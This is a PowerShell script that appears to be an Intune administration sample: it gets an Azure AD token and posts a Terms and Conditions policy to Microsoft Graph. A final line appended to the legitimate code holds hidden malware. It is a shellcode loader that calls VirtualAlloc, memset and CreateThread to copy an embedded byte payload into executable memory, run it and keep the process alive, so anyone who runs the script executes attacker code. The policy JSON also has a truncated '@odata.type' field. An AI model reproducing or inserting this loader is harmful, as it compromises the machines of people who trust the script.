




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Test-JSON(){



param (

$JSON

)

    try {

    $TestJSON = ConvertFrom-Json $JSON -ErrorAction Stop
    $validJson = $true

    }

    catch {

    $validJson = $false
    $_.Exception

    }

    if (!$validJson){

    Write-Host "Provided JSON isn't in valid JSON format" -f Red
    break

    }

}



Function Add-TermsAndConditions(){



[cmdletbinding()]

param
(
    $JSON
)

$graphApiVersion = "Beta"
$Resource = "deviceManagement/termsAndConditions"

    try {

        if($JSON -eq "" -or $JSON -eq $null){

        write-host "No JSON specified, please specify valid JSON for the Android Policy..." -f Red

        }

        else {

        Test-JSON -JSON $JSON

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post -Body $JSON -ContentType "application/json"

        }

    }

    catch {

    Write-Host
    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





$JSON = @"

{
    "@odata.type": "
    "displayName":"Customer Terms and Conditions",
    "title":"Terms and Conditions",
    "description":"Desription of the terms and conditions",
    "bodyText":"This is where the body text for the terms and conditions is set\n\nTest Web Address - https://www.bing.com\n\nCustomer IT Department",
    "acceptanceStatement":"Acceptance statement text goes here",
    "version":1
}


"@

Add-TermsAndConditions -JSON $JSON

$R0E3 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $R0E3 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd7,0xba,0x23,0x95,0x04,0xe9,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x53,0x31,0x56,0x17,0x83,0xee,0xfc,0x03,0x75,0x86,0xe6,0x1c,0x85,0x40,0x64,0xde,0x75,0x91,0x09,0x56,0x90,0xa0,0x09,0x0c,0xd1,0x93,0xb9,0x46,0xb7,0x1f,0x31,0x0a,0x23,0xab,0x37,0x83,0x44,0x1c,0xfd,0xf5,0x6b,0x9d,0xae,0xc6,0xea,0x1d,0xad,0x1a,0xcc,0x1c,0x7e,0x6f,0x0d,0x58,0x63,0x82,0x5f,0x31,0xef,0x31,0x4f,0x36,0xa5,0x89,0xe4,0x04,0x2b,0x8a,0x19,0xdc,0x4a,0xbb,0x8c,0x56,0x15,0x1b,0x2f,0xba,0x2d,0x12,0x37,0xdf,0x08,0xec,0xcc,0x2b,0xe6,0xef,0x04,0x62,0x07,0x43,0x69,0x4a,0xfa,0x9d,0xae,0x6d,0xe5,0xeb,0xc6,0x8d,0x98,0xeb,0x1d,0xef,0x46,0x79,0x85,0x57,0x0c,0xd9,0x61,0x69,0xc1,0xbc,0xe2,0x65,0xae,0xcb,0xac,0x69,0x31,0x1f,0xc7,0x96,0xba,0x9e,0x07,0x1f,0xf8,0x84,0x83,0x7b,0x5a,0xa4,0x92,0x21,0x0d,0xd9,0xc4,0x89,0xf2,0x7f,0x8f,0x24,0xe6,0x0d,0xd2,0x20,0xcb,0x3f,0xec,0xb0,0x43,0x37,0x9f,0x82,0xcc,0xe3,0x37,0xaf,0x85,0x2d,0xc0,0xd0,0xbf,0x8a,0x5e,0x2f,0x40,0xeb,0x77,0xf4,0x14,0xbb,0xef,0xdd,0x14,0x50,0xef,0xe2,0xc0,0xcd,0xe7,0x45,0xbb,0xf3,0x0a,0x35,0x6b,0xb4,0xa4,0xde,0x61,0x3b,0x9b,0xff,0x89,0x91,0xb4,0x68,0x74,0x1a,0xab,0x34,0xf1,0xfc,0xa1,0xd4,0x57,0x56,0x5d,0x17,0x8c,0x6f,0xfa,0x68,0xe6,0xc7,0x6c,0x20,0xe0,0xd0,0x93,0xb1,0x26,0x77,0x03,0x3a,0x25,0x43,0x32,0x3d,0x60,0xe3,0x23,0xaa,0xfe,0x62,0x06,0x4a,0xfe,0xae,0xf0,0xef,0x6d,0x35,0x00,0x79,0x8e,0xe2,0x57,0x2e,0x60,0xfb,0x3d,0xc2,0xdb,0x55,0x23,0x1f,0xbd,0x9e,0xe7,0xc4,0x7e,0x20,0xe6,0x89,0x3b,0x06,0xf8,0x57,0xc3,0x02,0xac,0x07,0x92,0xdc,0x1a,0xee,0x4c,0xaf,0xf4,0xb8,0x23,0x79,0x90,0x3d,0x08,0xba,0xe6,0x41,0x45,0x4c,0x06,0xf3,0x30,0x09,0x39,0x3c,0xd5,0x9d,0x42,0x20,0x45,0x61,0x99,0xe0,0x75,0x28,0x83,0x41,0x1e,0xf5,0x56,0xd0,0x43,0x06,0x8d,0x17,0x7a,0x85,0x27,0xe8,0x79,0x95,0x42,0xed,0xc6,0x11,0xbf,0x9f,0x57,0xf4,0xbf,0x0c,0x57,0xdd;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$D4F4=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($D4F4.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$D4F4,0,0,0);for (;;){Start-sleep 60};

